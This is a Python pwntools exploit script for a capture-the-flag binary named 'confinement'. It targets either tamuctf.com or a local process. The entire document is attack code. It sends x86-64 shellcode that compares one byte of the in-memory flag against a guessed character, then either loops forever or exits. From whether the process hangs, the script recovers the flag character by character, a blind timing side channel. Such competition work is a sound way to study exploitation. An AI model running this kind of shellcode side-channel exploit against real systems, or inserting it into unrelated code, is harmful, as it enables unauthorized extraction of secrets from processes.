#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings
import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF('confinement_patched')
# context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote("tamuctf.com", 443, ssl=True, sni="janky")
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+180
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def search(char, idx):
    sc = asm(f"""
        loop:
            mov r8, [rsp]
            add r8, 0x24d5a
            
            cmp BYTE PTR [r8 + {idx}], {char}
            jne exit
            jmp $
    
        exit:
            xor eax, eax
            mov eax, 0x1
            mov eax, 0xe7
            syscall
    """)

    io.send(sc)


def solve():
    flag = "g"
    charset = string.printable

    while flag[-1] != "}":
        for char in charset:
            sys.stdout.write(f"Trying: {flag}{char}")
            init()

            print(len(flag))
            search(ord(char), len(flag))
            
            gotten = True
    
            try:
                r = io.recv(1024, timeout=1)
                if b'adios' in r:
                    gotten = False
            except Exception:
                gotten = False
            
            io.close()

            print(flag)

            if gotten:
                flag += char
                break

if __name__ == '__main__':
    solve()

